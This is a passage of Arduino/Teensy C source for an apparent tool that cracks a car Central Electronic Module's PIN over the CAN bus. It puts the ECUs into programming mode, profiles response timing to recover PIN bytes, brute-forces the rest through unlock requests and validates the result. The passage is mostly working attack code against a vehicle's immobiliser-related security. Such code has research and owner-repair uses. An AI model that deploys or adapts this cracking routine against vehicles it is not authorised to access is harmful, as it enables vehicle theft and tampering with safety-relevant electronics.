  printf("Average response: %d\n", averageReponse);
}

/*******************************************************************************

   cemCrackPin - attempt to find the specified number of bytes in the CEM's PIN

   Returns: N/A
*/

void cemCrackPin (uint32_t maxBytes, bool verbose)
{
  uint8_t  pin[PIN_LEN];
  uint8_t  pinUsed[PIN_LEN];
  uint32_t start;
  uint32_t end;
  uint32_t percent = 0;
  uint32_t percent_5;
  uint32_t crackRate = 84; // just std response time for P2 platform
  uint32_t remainingBytes;
  bool     cracked = false;
  uint32_t i, time;
  
  printf ("Calculating bytes 0-%u\n", maxBytes - 1);


  /* start time */

  start = millis ();

  /* set the PIN to all zeros */

  memset (pin, 0, sizeof(pin));

  /* try and crack each PIN position */

  for (uint32_t i = 0; i < maxBytes; i++) {

    /* profile the CEM to see how fast it can process requests */

    crackRate = profileCemResponse (i);
    crackPinPosition (pin, i, verbose);

    if( operatingState == STATE_INTERRUPT_REQUESTED )
    {
        return;
    }
  }

  /* number of PIN bytes remaining to find */

  remainingBytes = PIN_LEN - maxBytes,

  /* show the result of the cracking */

  printf ("Candidate PIN ");

  /* show numerial values for the known digits */

  for (i = 0; i < maxBytes; i++) {
    printf ("0x%02x ", pin[i]);
  }

  /* placeholder for the remaining digits */

  while (i < PIN_LEN) {
    printf ("-- ");
    i++;
  }

  time = (uint32_t)(pow (100, remainingBytes) / crackRate);
  printf (": brute forcing bytes %u to %u (%u bytes), will take up to %u minutes %u seconds\n",
          maxBytes, PIN_LEN - 1, remainingBytes,
          time / 60, time - time / 60 * 60);

  /* 5% of the remaining PINs to try */

  percent_5 = pow (100, (remainingBytes)) / 20;

  printf ("Progress: ");

  /*
     Iterate for each of the remaining PIN bytes.
     Each byte has a value 0-99 so we iterare for 100^remainingBytes values
  */

  for (i = 0; i < pow (100, (remainingBytes)); i++) {
    uint32_t pinValues = i;

    /* fill in each of the remaining PIN values */

    for (uint32_t j = maxBytes; j < PIN_LEN; j++) {
      pin[j] = binToBcd (pinValues % 100);

      /* shift to the next PIN's value */

      pinValues /= 100;
    }

    /* try and unlock with this PIN */

    if (cemUnlock (pin, pinUsed, NULL, verbose)) {

      /* the PIN worked, print it and terminate the search */

      printf ("done\n");
while(1){
      printf ("\nfound PIN: %02x %02x %02x %02x %02x %02x",
              //              pin[0], pin[1], pin[2], pin[3], pin[4], pin[5]);
              pinUsed[0], pinUsed[1], pinUsed[2], pinUsed[3], pinUsed[4], pinUsed[5]);
    delay(2000);
}
      cracked = true;
      break;
    }
    
    /* print a periodic progress message */

    if ((i % percent_5) == 0) {
      printf ("%u%%..", percent * 5);
      percent++;
    }

    
    /* check if user didn't want to interrupt */
    if( operatingState == STATE_INTERRUPT_REQUESTED )
    {
        return;
    }

  }

  /* print execution summary */

  end = millis ();
  time = (end - start) / 1000.0;
  printf ("\nPIN is %scracked in %u minutes %u seconds\n", cracked ? "" : "NOT ", time / 60, time - time / 60 * 60);

  /* validate the PIN if we were able to crack it */

  if (cracked == true) {

    uint8_t data[CAN_MSG_SIZE];
    uint32_t can_id = 0;

    printf ("Validating PIN\n");

    /* send the unlock request to the CEM */

    data[0] = CEM_ECU_ID;
    data[1] = 0xBE;
    data[2] = pinUsed[0];
    data[3] = pinUsed[1];
    data[4] = pinUsed[2];
    data[5] = pinUsed[3];
    data[6] = pinUsed[4];
    data[7] = pinUsed[5];

    canMsgSend (CAN_HS, 0xffffe, data, verbose);

    /* get the response from the CEM */

    memset (data, 0, sizeof(data));

    (void) canMsgReceive (&can_id, data, true, false);

    /* verify the response came from the CEM and is a successful reply to our request */

    if ((can_id == 3) &&
        (data[0] == CEM_ECU_ID) && (data[1] == 0xB9) && (data[2] == 0x00)) {
      printf ("PIN verified.\n");
    } else {
      printf ("PIN verification failed!\n");
    }
  }

  printf ("done\n");
}

#if (HW_SELECTION == MCP2515_HW)

/*******************************************************************************

   mcp2515Init - initialize MCP2515 external CAN controllers

   Returns: N/A
*/

void mcp2515Init (void)
{
  printf ("CAN_HS init\n");

  //while(CAN_OK != CAN_HS.begin(CAN_500KBPS)) {
  //while (MCP2515_OK != CAN_HS.begin (CAN_HS_BAUD)) {
  while (MCP2515_OK != CAN_HS.begin (CAN_HS_BAUD, MCP2515_CLOCK)) {
    delay (1000);
  }

  printf ("CAN_HS init done\n");

  //pinMode (CAN_INTR_PIN, INPUT);
  pinMode (CAN_INTR_PIN, INPUT_PULLUP);
  attachInterrupt (digitalPinToInterrupt (CAN_INTR_PIN), canInterruptHandler, FALLING);

#ifdef HAS_CAN_LS
  printf ("CAN_LS init\n");
  while (MCP2515_OK != CAN_LS.begin (CAN_LS_BAUD, MCP2515_CLOCK)) {
    delay (1000);
  }
  printf ("CAN_LS init done\n");
#endif
}

#elif (HW_SELECTION == TEENSY_CAN_HW)

/*******************************************************************************

   flexCanInit - initialize Teensy internal CAN controllers

   Returns: N/A
*/

void flexCanInit (void)
{

  /* high-speed CAN bus initialization */

  can_hs.begin ();
  can_hs.setBaudRate (CAN_HS_BAUD);
  can_hs.enableFIFO();
  can_hs.enableFIFOInterrupt ();
  //can_hs.setFIFOFilter(ACCEPT_ALL);
  can_hs.setFIFOFilter(REJECT_ALL);
  can_hs.setFIFOFilter(0, 0x3, EXT);
  can_hs.setFIFOFilter(1, 0x1200003, EXT); // P2
  can_hs.setFIFOFilter(2, 0x400003, EXT);  // P1
  can_hs.onReceive (canHsEvent);
  printf ("CAN high-speed init done.\n");

#if defined(SHOW_CAN_STATUS)
  can_hs.mailboxStatus ();
#endif

  /* low-speed CAN bus initialization */

#if defined(HAS_CAN_LS)
  can_ls.begin ();
  can_ls.setBaudRate (CAN_LS_BAUD);
  can_ls.enableFIFO();
  printf ("CAN low-speed init done.\n");

#if defined(SHOW_CAN_STATUS)
  can_ls.mailboxStatus ();
#endif
#endif

  /* enable the time stamp counter */

  ARM_DEMCR |= ARM_DEMCR_TRCENA;
  ARM_DWT_CTRL |= ARM_DWT_CTRL_CYCCNTENA;
}

/*******************************************************************************

   ext_output1 - called by FlexCAN_T4's receive interrupt handler

   Returns: N/A
*/

void ext_output1 (const CAN_message_t &msg)
{
  canInterruptHandler ();
}

#endif /* HW_SELECTION */

/*******************************************************************************

   __assert__ - support function for assert() macro

   Returns: N/A
*/

void __assert__ (const char *__func, const char *__file,
                 int __lineno, const char *__sexp) {

  /* print an informational message about the assertion */

  printf ("Failed assertion '%s' in %s() line %d.",
          __sexp, __func, __lineno);

  /* halt execution */

  while (1);
}


void buttonTimerHandler()
{
    static uint32_t pressedTicks=0;
    static uint32_t depressedTicks=0;
    static bool resetExecuted=false;
    static uint8_t lastButtonState=3; // sth other then 0 or 1 :)


    /* 
     *  State description:
     *      0/LOW  - button pressed
     *      1/HIGH - button depressed
     */
    if(digitalRead(BUTTON_PIN) == LOW)
    {
        // button pressed (shorted to ground)
        if( lastButtonState == 1)
        {
            pressedTicks=0;
                    
            if( operatingState == STATE_IDLE )
            {
                operatingState = STATE_RESTART_REQUESTED;
            }
            #if (DEBUG_LATENCY == 1)
                DEBUG_LATENCY_ENABLED = !DEBUG_LATENCY_ENABLED;
            #endif
        }
        pressedTicks++;
        lastButtonState=0;
    }
    else
    {
        // button depressed (pullup high)
        if( lastButtonState == 0)
        {
            depressedTicks=0;
                   
            if( operatingState == STATE_IDLE )
            {
                operatingState = STATE_RESTART_REQUESTED;
            }
            #if (DEBUG_LATENCY == 1)
                DEBUG_LATENCY_ENABLED = !DEBUG_LATENCY_ENABLED;
            #endif
        }
        depressedTicks++;
        lastButtonState=1;
    }
    //printf ("Button status : %5u - %5u\n", pressedTicks, depressedTicks);

    /*
     * This event should be triggered only if switch was pressed/depressed twice within one second
     */
    if ( !resetExecuted && 
        pressedTicks<TICKS_PER_SECOND && 
        depressedTicks<TICKS_PER_SECOND && 
        pressedTicks>0 && 
        depressedTicks>0 &&
        ( operatingState == STATE_CRACKING || operatingState == STATE_INITIALIZING )
       )
    {
        printf("\n\nUSER INTERRUPT: aborting...\n");
        operatingState = STATE_INTERRUPT_REQUESTED;
        resetExecuted=true;
    }

    if( pressedTicks+depressedTicks > 2*TICKS_PER_SECOND )
    {
        resetExecuted=false;
    }

}

/*******************************************************************************

   setup - Arduino entry point for hardware configuration

   Returns: N/A
*/

void setup (void)
{

    printf("Waiting 3 seconds for terminal to connect...\n");
    // RPP delay(3000);
    
  /* set up the pin for sampling the CAN bus */

  pinMode (CAN_L_PIN, INPUT_PULLUP);
  pinMode(BUTTON_PIN, INPUT_PULLUP);

  buttonTimer.begin(buttonTimerHandler, 1000000/TICKS_PER_SECOND);  // check button state every XX second

  /* set up the serial port */

  Serial.begin (115200);
  delay (500);

#if defined(TEENSY_MODEL_4X)

  /* lowering the Teensy 4.x clock rate provides more consistent results - not really */
  //printf("Setting CPU clock to 180MHz\n");
  //set_arm_clock (180000000);
#endif

  printf ("CPU Maximum Frequency:   %u\n", F_CPU);
#if defined(TEENSY_MODEL_4X)
  printf ("CPU Frequency:           %u\n", F_CPU_ACTUAL);
#endif
  printf ("Execution Rate:          %u cycles/us\n", clockCyclesPerMicrosecond ());
  printf ("Minimum CEM Reply Time:  %uus\n", CEM_REPLY_US);
  printf ("PIN bytes to measure:    %u\n", CALC_BYTES);
  printf ("Number of samples:       %u\n", SAMPLES);
  printf ("Number of loops:         %u\n\n", NUM_LOOPS);

#if (HW_SELECTION == MCP2515_HW)
  mcp2515Init ();

  CAN_HS.init_Filt(0, 1, 0);
  CAN_HS.init_Mask(0, 1, 0);

#elif (HW_SELECTION == TEENSY_CAN_HW)
  flexCanInit ();
#endif /* HW_SELECTION */



  printf ("Initialization done.\n\n");
}

/*******************************************************************************

   loop - Arduino main loop

   Returns: N/A
*/

void loop (void)
{
  bool verbose = false;

  while(true)
  {

      progModeOff ();
      identifyPlatform();
    
      printf("\n");
      /* drain any pending messages */
      while (canMsgReceive (NULL, NULL, false, false) == true)
        ;
      if( operatingState != STATE_INITIALIZING) 
      {
        continue;
      }
     
      /* put all ECUs into programming mode */
      progModeOn ();
    
      /* drain any pending messages */
      while (canMsgReceive (NULL, NULL, false, false) == true)
        ;
    
      /* print the CEM's part number */
      ecuPrintPartNumber (CEM_ECU_ID);
      printf("\n");
    
      /* try and crack the PIN */
      cemCrackPin (CALC_BYTES, verbose);
    
      /* exit ECU programming mode */
      progModeOff ();

      printf("Done.\n");
      /* all done, stop */
      for (;;) 
      {
          if( operatingState == STATE_RESTART_REQUESTED ) 
          {
            printf("\nRestarting pin cracking\n");
            break;
          }
      }
      
   } // while (true)
}
